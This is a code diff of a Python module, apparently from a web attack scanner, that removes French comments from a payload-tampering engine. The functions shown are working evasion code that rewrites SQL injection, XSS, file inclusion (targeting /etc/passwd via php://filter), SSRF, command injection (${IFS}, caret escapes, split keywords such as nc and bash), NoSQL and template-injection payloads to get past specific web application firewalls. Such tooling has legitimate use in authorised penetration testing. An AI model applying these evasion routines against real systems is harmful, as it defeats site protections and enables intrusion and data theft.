@@ -5,7 +5,6 @@ import struct
 import string
 from urllib.parse import quote
 
-# CONFIGURATION & STRATÉGIES 
 WAF_STRATEGIES = {
     'Cloudflare': {
         'sqli_space': ["/*+*/", "%0A", "%09", "+", "%20"], 
@@ -116,30 +115,21 @@ def insert_junk(s, chars=" \t\n\r"):
     return res
 
 def path_obfuscate(payload):
-    """
-    Masque les caractères critiques dans le payload LFI/XSS pour le transport URL.
-    """
     res = payload
     
-    # Remplacement des barres obliques pour LFI 
     if "../" in res:
-        # Masquage par encodage de caractères 
         res = res.replace("/", "%5c").replace(".", "%2e") 
     
-    # Obfuscation des chevrons pour XSS 
     if "<" in res:
         res = res.replace("<", "%253c%0a").replace(">", "%253e%0a") 
         
     return res
 
-# 1. SQL INJECTION 
 def sql_obfuscate(payload, strategy):
-    # A. Gestion des Espaces 
     spaces = strategy.get('sqli_space', ["/**/", "+", "%09", "%0A", "%0C", "%0D", "/*+*/"])
     chosen_space = random.choice(spaces)
     payload = payload.replace(" ", chosen_space)
 
-    # B. Mots-clés & Fonctions
     keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'GROUP', 'SLEEP', 'BENCHMARK', 'WAITFOR', 'DELAY']
     tech = strategy.get('sqli_keywords', 'random')
     
@@ -148,19 +138,15 @@ def sql_obfuscate(payload, strategy):
 
     for kw in keywords:
         if kw in payload.upper():
-            # 1. Case Toggling (SeLeCt)
             if tech == 'case_toggle':
                 payload = re.sub(kw, random_case(kw), payload, flags=re.IGNORECASE)
-            # 2. Comment Splitting (SEL/**/ECT)
             elif tech == 'comment_split':
                 mid = random.randint(1, len(kw)-1)
                 obf_kw = kw[:mid] + "/**/" + kw[mid:]
                 payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)
-            # 3. Versioned Comments (/*!50000SELECT*/) - MySQL
             elif tech == 'versioned': 
                 obf_kw = f"/*!50000{random_case(kw)}*/"
                 payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)
-            # 4. Concaténation SQL ('S'||'ELECT')
             elif tech == 'concat':
                 mid = len(kw) // 2
                 if random.choice([True, False]):
@@ -169,24 +155,20 @@ def sql_obfuscate(payload, strategy):
                     obf_kw = f"'{kw[:mid]}'||'{kw[mid:]}'"
                 payload = re.sub(kw, obf_kw, payload, flags=re.IGNORECASE)
 
-    # C. Encodage Hexadécimal des chaînes
     if "'" in payload and tech == 'hex_encode':
         def hex_replacer(match):
             return to_hex(match.group(1))
         payload = re.sub(r"'(\w+)'", hex_replacer, payload)
 
-    # D. Opérateurs Logiques 
     payload = re.sub(r'\sOR\s', '||', payload, flags=re.IGNORECASE)
     payload = re.sub(r'\sAND\s', '&&', payload, flags=re.IGNORECASE) # MySQL
 
     return payload
 
-# 2. CROSS-SITE SCRIPTING
 def xss_obfuscate(payload, strategy):
     tech = strategy.get('xss_tags', 'random')
     if tech == 'random': tech = random.choice(['case', 'newline', 'html', 'unicode', 'junk'])
 
-    # A. Obfuscation des Balises 
     if tech == 'newline':
         payload = re.sub(r'<([a-z]+)', lambda m: '<' + m.group(1)[:1] + '%0A' + m.group(1)[1:], payload, flags=re.IGNORECASE)
     elif tech == 'html':
@@ -198,15 +180,12 @@ def xss_obfuscate(payload, strategy):
     else:
         payload = re.sub(r'<([a-z]+)', lambda m: '<' + random_case(m.group(1)), payload, flags=re.IGNORECASE)
 
-    # B. Obfuscation des Attributs 
     payload = payload.replace("=", random.choice(["=", "\t=", "%09=", " = ", "%0A="]))
     
-    # C. Obfuscation des Payloads JS (alert)
     if "alert" in payload:
         subs = ["alert", "window['alert']", "self['alert']", "top['alert']", "\\u0061lert"]
         payload = payload.replace("alert", random.choice(subs))
     
-    # D. Encodage des parenthèses/quotes
     if "(" in payload:
         payload = payload.replace("(", random.choice(["(", "&#40;", "%28"]))
         payload = payload.replace(")", random.choice([")", "&#41;", "%29"]))
@@ -214,24 +193,21 @@ def xss_obfuscate(payload, strategy):
     payload = payload.replace("'", "\\u0027").replace('"', "\\u0022")
     
     if '<' in payload and '>' in payload:
-        # Encodage HTML des chevrons critiques pour cacher le tag
         payload = payload.replace("<", "&#x3c;")
         payload = payload.replace(">", "&#x3e;")
         
     return payload
 
-# 3. LOCAL FILE INCLUSION 
+
 def lfi_obfuscate(payload, strategy):
     tech = strategy.get('lfi_encoding', 'random')
     if tech == 'random': tech = random.choice(['double', 'utf8', 'nested', 'null', 'truncate', 'simple_url']) 
 
-    # Base payload protection 
     if "/" not in payload: 
         if tech == 'null':
             return payload + "%00"
         return payload
 
-    # A. Path Traversal Evasion
     if tech == 'nested':
         payload = payload.replace("../", "....//")
         payload = payload.replace("..\\", "....\\\\")
@@ -244,23 +220,19 @@ def lfi_obfuscate(payload, strategy):
     elif tech == 'simple_url':
         payload = payload.replace("/", "%2f").replace(".", "%2e")
     
-    # B. Techniques Système
     if tech == 'truncate':
         payload = payload + "." * 200
     elif tech == 'null':
         if "%00" not in payload: payload += "%00"
 
-    # C. Multi Slashes 
     payload = re.sub(r'/', '/' * random.randint(2, 4), payload)
     
-    # D. Wrappers PHP 
     if "/etc/passwd" in payload and "php://" not in payload:
         if random.choice([True, False]):
             payload = payload.replace("/etc/passwd", "php://filter/resource=/etc/passwd")
     
     return payload
 
-# 4. SERVER-SIDE REQUEST FORGERY 
 def ip_to_dword(ip):
     try:
         packed = socket.inet_aton(ip)
@@ -271,7 +243,6 @@ def ssrf_obfuscate(payload, strategy=None):
     if "wafmap-callback.test" in payload:
         return payload
     
-    # A. IP Obfuscation 
     ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', payload)
     if ip_match:
         ip = ip_match.group(1)
@@ -283,32 +254,27 @@ def ssrf_obfuscate(payload, strategy=None):
             new_ip = '.'.join([format(int(x), '04o') for x in ip.split('.')])
         elif mode == 'hex':
             new_ip = hex(ip_to_dword(ip))
-        else: # Dotted Hex (0x7f.0x0.0x0.0x1)
+        else: 
             new_ip = '.'.join([hex(int(x)) for x in ip.split('.')])
 
         payload = payload.replace(ip, new_ip)
     
-    # B. Protocol & DNS Tricks
     if "http://" in payload:
         payload = re.sub(r'http://', 'hTTp://', payload, flags=re.IGNORECASE)
         payload = payload.replace("://", "://0@")
     
-    # C. Localhost Synonyms
     shortcuts = ["[::]", "0.0.0.0", "0", "127.1", "localtest.me"]
     payload = payload.replace("localhost", random.choice(shortcuts))
     
     return payload
 
-# 5. COMMAND INJECTION 
 def cmdi_obfuscate(payload, strategy=None):
     if "wafmap-callback.test" in payload:
         return payload
         
-    # Détection heuristique de l'OS cible (Windows utilise \, Linux utilise /)
     is_windows = "\\" in payload or "type" in payload.lower() or "ping" in payload and "-n" in payload
     
     if is_windows:       
-        # 1. Caret Escape (w^ho^ami)
         res = ""
         for char in payload:
             if char == " ":
@@ -319,11 +285,9 @@ def cmdi_obfuscate(payload, strategy=None):
                 res += char
         payload = res
         
-        # 2. Random Case (Windows est insensible à la casse)
         payload = random_case(payload)
 
     else:
-        # 1. Evasion d'espaces 
         if " " in payload:
             replacements = ["${IFS}", "$IFS$9", "\t", "<", "%09"]
             
@@ -332,7 +296,6 @@ def cmdi_obfuscate(payload, strategy=None):
             else:
                  payload = payload.replace(" ", random.choice(replacements))
 
-        # 2. Cassure de Mots-Clés 
         keywords = ['cat', 'whoami', 'id', 'ls', 'ping', 'nc', 'python', 'bash', 'sh', 'uname', 'echo']
         for kw in keywords:
             if kw in payload:
@@ -364,14 +327,12 @@ def cmdi_obfuscate(payload, strategy=None):
                         obf_kw += f"'{c}'"
                     payload = payload.replace(kw, obf_kw)
 
-        # 3. Substitution de Commande / Wrapping
         if payload in ['id', 'whoami', 'ls', 'pwd']:
             if random.choice([True, False]):
                 payload = f"$({payload})" # $(id)
             else:
                 payload = f"`{payload}`"   # `id`
         
-        # 4. Wildcards 
         if "/" in payload:
              def glob_replace(match):
                  s = match.group(0)
@@ -386,29 +347,22 @@ def cmdi_obfuscate(payload, strategy=None):
 
     return payload
 
-# 6. NOSQL INJECTION (NoSQLi)
 def nosqli_obfuscate(payload, strategy=None):
-    # A. JS Comments 
     if "||" in payload: payload = payload.replace("||", "/*a*/||/*b*/")
     if "==" in payload: payload = payload.replace("==", "/*a*/==/*b*/")
     
-    # B. JSON Whitespace/Tabulation
     if "{" in payload:
         payload = payload.replace(":", " : ").replace("{", "{ ").replace(",", ", ")
         
-    # C. Unicode Escape pour les clés ($ne)
     if "$ne" in payload: payload = payload.replace("$ne", "\\u0024ne")
     if "$gt" in payload: payload = payload.replace("$gt", "\\u0024gt")
     if "$where" in payload: payload = payload.replace("$where", "\\u0024where")
     
     return payload
 
-# 7. TEMPLATE INJECTION 
 def ssti_obfuscate(payload, strategy=None):
-    # A. Espaces et Commentaires
     payload = payload.replace("{{", "{{ ").replace("}}", " }}")
     
-    # B. Alternative Syntax 
     if "class" in payload:
         payload = payload.replace("class", "'cla'+'ss'")
     if "config" in payload:
@@ -417,13 +371,9 @@ def ssti_obfuscate(payload, strategy=None):
     return payload
 
 def apply_tampering(payload, vtype, enabled, waf_name=None):
-    """
-    Applique l'obfuscation intelligente basée sur le WAF détecté.
-    """
     if not enabled:
         return payload
 
-    # 1. Chargement de la stratégie
     strategy = get_strategy(waf_name)
     
     res = payload
@@ -438,7 +388,6 @@ def apply_tampering(payload, vtype, enabled, waf_name=None):
     if vtype in ['lfi', 'xss', 'ssrf']:
         res = path_obfuscate(res) 
     
-    # 2. Encodage URL Global 
     if vtype != 'lfi':
         return url_encode_recursive(res, level=1)
     return res
